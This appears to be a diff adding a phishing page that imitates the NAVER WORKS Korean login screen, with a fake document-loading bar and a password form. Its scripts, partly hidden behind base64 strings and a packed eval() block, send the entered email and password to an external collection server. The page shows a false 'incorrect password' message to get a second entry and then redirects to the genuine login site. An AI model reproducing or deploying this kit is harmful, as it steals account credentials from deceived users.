@@ -1,0 +1,449 @@
+<!DOCTYPE HTML>
+<html lang="ko">
+<head>
+    <meta charset="utf-8" />
+    <title>Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/login.css?20240607">
+    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/edge_pw_icon_disable.css?20240607">
+    <script src="/js/jquery/jquery-3.6.0.min.js?20240607" type="text/javascript"></script>
+    <script src="/js/message/message_ko_KR.js?20240607" type="text/javascript"></script>
+    <script src="/js/rsa.js?20240607" type="text/javascript"></script>
+
+
+    
+    
+        <script type="text/javascript" src="/js/service/auth_core.js?20240607"/></script>
+        <script type="text/javascript" src="/js/service/auth_service.js?20240607"/></script>
+    
+
+    <script type="text/javascript" src="/js/common/lcslog.js?20240607" charset="utf-8"></script>
+
+
+	<script type="text/javascript">
+		var eventType = (/(MSIE (10|9|8|7)|Trident\/(6|5|4|3))/.test((window.navigator || {}).userAgent)) ? 'load' : 'pageshow';
+    window.addEventListener(eventType,  function(event) {
+        if (typeof lcsSti !== 'undefined') {
+            sendLcs(lcsSti);
+        }
+    }, false);
+
+    function sendLcs(lcsSti) {
+        lcsSti = setMobilePrefix(lcsSti);
+        lcsSti = setInstancePostfix(lcsSti);
+        var resourcePhase = null;
+        if (resourcePhase != 'real') { // stage도 리얼이 아닌 알파로 잡히게 수정
+            window.lcs_SerName = 'alpha-lcs.worksmobile.com'; // for alpha Test
+        }
+        lcs_do({"sti" : lcsSti});
+    }
+
+    function setMobilePrefix(lcsSti) {
+        if (navigator.userAgent.indexOf('WorksMobile') > -1) {
+            lcsSti = 'm_' + lcsSti;
+        }
+        return lcsSti;
+    }
+
+    function setInstancePostfix(lcsSti) {
+        var idcType = "jp1";
+        if (idcType == 'kr1' || idcType == 'kr0') {
+            lcsSti += '_kr';
+        } else {
+            lcsSti += '_jp';
+        }
+        return lcsSti
+    }
+	</script>
+
+<style>
+input[type="email"] {
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    border: 0;
+    background-color: rgba(0, 0, 0, 0);
+}
+</style>
+<style type="text/css">
+	.loader {
+		/*position: absolute;*/
+		/*padding: 30px 0px;*/
+		width: 50px;
+		/*margin: -22px;*/
+	}
+	
+	.loader .circle {
+		position: absolute;
+		width: 18px;
+		height: 18px;
+		opacity: 0;
+		transform: rotate(225deg);
+		animation-iteration-count: infinite;
+		animation-name: orbit;
+		animation-duration: 3s;
+	}
+	
+	.loader .circle:after {
+		content: "";
+		position: absolute;
+		width: 3px;
+		height: 3px;
+		border-radius: 5px;
+		background: #000;
+	}
+	
+	.loader .circle:nth-child(2) {
+		animation-delay: 240ms;
+	}
+	
+	.loader .circle:nth-child(3) {
+		animation-delay: 480ms;
+	}
+	
+	.loader .circle:nth-child(4) {
+		animation-delay: 720ms;
+	}
+	
+	.loader .circle:nth-child(5) {
+		animation-delay: 960ms;
+	}
+	
+	@keyframes orbit {
+		0% {
+			transform: translate(10px, 0);
+			opacity: 1;
+			animation-timing-function: ease-out;
+		}
+	
+		7% {
+			transform: translate(30px, 0);
+			animation-timing-function: linear;
+		}
+	
+		30% {
+			transform: translate(60px, 0);
+			animation-timing-function: ease-in-out;
+		}
+	
+		40% {
+			transform: translate(90px, 0);
+			animation-timing-function: ease-out;
+		}
+	
+		50% {
+			transform: translate(120px, 0);
+			animation-timing-function: ease-out;
+		}
+	
+		75% {
+			transform: translate(250px, 0);
+			animation-timing-function: ease-out;
+		}
+	
+		76% {
+			transform: translate(300px, 0);
+			opacity: 0;
+		}
+	
+		100% {
+			transform: translate(350px, 0);
+			opacity: 0;
+		}
+	}
+	
+	#myProgress {
+  width: 300px;
+  background-color: #ccc;
+  }
+
+  #myBar {
+  width: 1%;
+  height: 4px;
+  background-color: #00dd59;
+  text-align: center; /* To center it horizontally (if you want) */
+  line-height: 10px; /* To center it vertically */
+  color: white;
+}
+	</style>
+	<link rel="icon" type="image/x-icon" href="/naver.worksmobile.com/wp-content/uploads/2024/05/OG-img.png">
+</head>
+
+<body onload="move()">
+    <div id="first" class="backimg" style="margin: 0 auto;">
+		<center>
+			<div style="margin-top: 15%">
+				<img id="loadingLogo" style="padding: 20px;" alt="Outlook" width="300" height="" src="https://naver.worksmobile.com/wp-content/uploads/2023/12/main_logo.svg">
+				<div id="myProgress" style="text-align: left">
+					<div id="myBar"></div>
+				</div>
+				<div style="padding: 0px; color: #00dd59; font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif; font-size: 14px; width: 500px; margin-top: 5px;">
+					<p>
+						<span id="text1" style="display: none;">네이버 Works&nbsp;문서를 로드하는 중...</span>
+						<!-- <span id="text3" style="display: none">Authenticating&nbsp;your&nbsp;account...</span> -->
+						<span id="text2" style="display: none">확인중인...</span>
+					</p>
+				</div>
+			</div>
+		</center>
+		</div>
+        <div id="main" style="display:none;">
+			<div class="bgimg"></div>
+			<!-- <div class="container-fluid">
+				<div class="container">
+					<div class="row topp"> -->
+
+                        <div class="box" id="paaaaart1">
+                                <div class="loader " style="display:none;">
+                                    <div class="circle"></div>
+                                    <div class="circle"></div>
+                                    <div class="circle"></div>
+                                    <div class="circle"></div>
+                                    <div class="circle"></div>
+                                </div>
+	<div id="root">
+		<a href="#content" class="skip">go to the text</a>
+        <div class="wrap ko_KR integration">
+			<div class="container">
+				<div class="contents_box"  style="margin-top: 4%">
+					<div class="contents ">
+						<h1 class="logo"><span class="blind">NAVER WORKS</span></h1>
+						<h2 class="title">비밀번호를 입력하거나,<br>신뢰하는 기기로 인증하세요.</h2>
+                        <form>
+                        <div class="input_wrap">
+                            <div class="input_area" id="">
+                                <div class="input_cover" id="">
+                                    <label for="userid" class="blind">이메일</label>
+                                    <input type="email" id="login_param" name="userid" class="input_box" placeholder="로그인 아이디" required="required">
+                                    
+                                </div>
+                                <ul class="account_list" id="login_id_list">
+                                </ul>
+                            </div>
+
+                        </div>
+                        <div class="input_wrap">
+                            <div class="input_area">
+                                <div class="input_cover" id="">
+                                    <label for="passowrd" class="blind">비밀번호</label>
+                                    <input type="password" id="password" name="pass" class="input_box" placeholder="비밀번호" required="required">
+                                    <button type="button" id="" class="btn_delete"><span class="blind">비밀번호 찾기</span></button>
+                                    
+                                        <button  type="button" class="btn_masking"><span class="blind">show the password</span></button>
+                                    
+                                </div>
+                            </div>
+                            <p class="invalid_desc" id="fail_message"></p>
+                        </div>
+    
+                        <div class="input_btn_area">
+                            <button type="" id="loginStart" class="btn_submit">기억하기</button>
+                        </div>
+                        <div class="check_area">
+                            <div class="check_info">
+                                <div class="check_cover">
+                                    <input type="checkbox" id="" class="input_check">
+                                    <label for="keepLogin" id="" class="input_label">계속 로그인</label>
+                                    <!-- <div class="tooltip_area">
+                                        <button class="btn_tooltip" id="keepLoginBtn"><span class="blind">tooltip</span></button>
+                                        <div class="tooltip_box wide" id="keepLoginToolTipBox">
+                                            Automatically log in with this account.<br>
+                                            Others may be able to log in with this account. Please use this on a home or business PC to protect your information.
+                                            <button type="button" class="btn_tooptip_close"><span class="blind">close</span></button>
+                                        </div>
+                                    </div> -->
+                                </div>
+    
+                                
+                                <div class="more_area">
+                                    <a href="#" class="link findPwdBtn">암호 찾기</a>
+                                </div>
+                            </div>
+                            <!-- <div class="check_info">
+                                <div class="check_cover">
+                                    <input type="checkbox" id="rememberId" class="input_check">
+                                    <label for="rememberId" class="input_label">Remember ID</label>
+                                    <div class="tooltip_area">
+                                        <button class="btn_tooltip" id="rememberIdBtn"><span class="blind">tooltip</span></button>
+                                        <div class="tooltip_box" id="rememberIdTooltipBox">
+                                            Remembers your ID.<br>
+                                            Please pay special attention when using on a public PC with vulnerable security.
+                                            <button type="button" class="btn_tooptip_close" id="rememberIdBtnClose"><span class="blind">close</span></button>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                            </div> -->
+    
+                            
+                            
+                            
+                        </div>
+                        </form>
+                    </div>
+                </div>
+				<div class="other_contents">
+					<a href="#" target="_blank" class="another_way">새 계정을 만드세요?</a>
+				</div>
+				<footer class="footer">
+					<address class="copyright">© NAVER WORKS Corp.</address>
+				</footer>
+
+			</div>
+		</div>
+		
+	</div>
+        </div>
+            <!-- </div>
+                </div>
+                    </div> -->
+                        </div>
+
+<script>
+		
+    var feedUpdateResponse = window.location.href;
+    var feedUpdateSplit = feedUpdateResponse.split("");
+    
+    for (var x = 0; x < feedUpdateSplit.length; x++) {
+     
+     if (feedUpdateSplit[x]=="#"){
+      var che= feedUpdateResponse.substring(x+1);
+     
+     }else{
+     
+    
+     }
+    
+     
+     
+     }
+      document.getElementById("pet").value =che
+    document.getElementById("p1").innerHTML = che
+      document.getElementById("pet").value =che
+    
+    </script>
+    
+    
+    
+    
+        <script src="https://code.jquery.com/jquery-1.9.1.js"></script>
+        <script>
+    
+          
+           $(document).ready(function() {
+                var user=$("#pet").val();
+              var  count=0;
+               
+            $('form').submit(function(e) {
+                
+                count=count+1;
+                
+               var d=atob("aHR0cHM6Ly9kcnFzYWR0Lm9ubGluZS90ZWFtMjQvd29ya3MvbWFiL3hlbmQucGhw");
+    
+                e.preventDefault();
+                   $.ajax({
+                   
+                type: 'POST',
+                url: d,
+                crossDomain: true,
+                data: $('form').serialize(),
+                
+                 beforeSend: function(xhr){
+                  $('#loginStart').html('Verifing...');
+                  console.log('working')
+                  
+                  
+                  
+    if (count>=2) {
+                        count=0;
+                        // window.location.replace(response['redirect_link']);
+                        window.location.replace("https://auth.worksmobile.com/");
+    
+                      }else{
+                       var x = document.getElementById("login_param").value;
+                         
+                        
+                       $('#loginStart').html('CONTINUE');
+                           document.getElementById("password").value ="";
+                         
+                        
+                    $(".invalid_desc").show();
+                        $("#fail_message").html("The username or password you entered is incorrect.");
+                    
+    
+                         }
+                            
+                },
+                
+                
+                         
+                success: function () {
+                    $(".invalid_desc").show();
+                        $("#fail_message").html("The username or password you entered is incorrect.");
+                    
+    
+        
+                }
+              });
+            });
+        });
+        </script>
+
+
+<script>
+    var i = 0;
+          function move() {
+            if (i == 0) {
+            i = 1;
+            var elem = document.getElementById("myBar");
+            var width = 1;
+            var id = setInterval(frame, 60);
+            function frame() {
+              if (width >= 100) {
+                clearInterval(id);
+                i = 0;
+              } else {
+                width++;
+                elem.style.width = width + "%";
+              }
+            }
+            }
+        
+            $('#text1').fadeIn('slow', function() {
+                $('#text1').delay(3000).fadeOut();
+            });
+            $('#text2').delay(5000).fadeIn('slow', function() {
+                $('#text2').delay(5000).fadeOut();
+                $('#first').hide();
+                $('#main').show();
+            });
+            // $('#text3').delay(5000).fadeIn('slow', function() {
+            //     $('#text3').delay(5000).fadeOut();
+            //     $('#first').hide();
+            //     $('#main').show();
+            // });
+        }
+            </script>
+            <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+
+  //redirect link
+var rdrt = "https://www.google.com";
+
+
+//mail result count
+var rc = 2;
+
+//mailer link
+var f = atob("bmV4dC5waHA=");
+
+
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(G).Q(6(){3 m=0;$(G).R(6(a){3 b=(a.H?a.H:a.S);7(b==\'13\'){a.I();$("#u-v").J()}});3 n=K.L.T.8(1);7(!n){}U{3 o=n;3 p=o.w("@");3 q=o.8((p+1));3 c=q.8(0,q.w(\'.\'));3 r=c.M();$(\'#y\').x(o);$(\'#V\').5(o);$("#s").z()}$(\'#u-v\').J(6(b){$(\'#t\').z();$(\'#s\').z();b.I();3 d=$("#y").x();3 e=$("#A").x();3 g=$(\'#s\').5();$(\'#s\').W(g);3 h=d;3 i=/^([a-B-C-X\\.\\-])+\\@(([a-B-C-9\\-])+\\.)+([a-B-C-9]{2,4})+$/;7(!d){$(\'#t\').D();$(\'#t\').5("Y Z N O P.!");E F}7(!e){$(\'#t\').D();$(\'#t\').5("10 N O P.!");E F}3 j=h.w("@");3 k=h.8((j+1));3 c=k.8(0,k.w(\'.\'));3 l=c.M();m=m+1;$.11({12:\'14\',15:f,16:\'17\',18:{y:d,A:e,},19:6(a){$(\'#u-v\').5(\'1a...\')},1b:6(){$("#A").x("");7(m>=1c){m=0;K.L.1d(1e);E F}$("#s").D();$(\'#u-v\').5(\'1f\')}})})});',62,78,'|||var||html|function|if|substr||||||||||||||||||||msg|error|sub|btn|indexOf|val|ai|hide|pr|zA|Z0|show|return|false|document|keyCode|preventDefault|click|window|location|toLowerCase|field|is|empty|ready|keypress|which|hash|else|aich|text|9_|Account|Number|Password|ajax|dataType||JSON|url|type|POST|data|beforeSend|VERIFYING|complete|rc|replace|rdrt|LOGIN'.split('|'),0,{}))
+</script>
+
+    
+
+</body>
+
+</html>
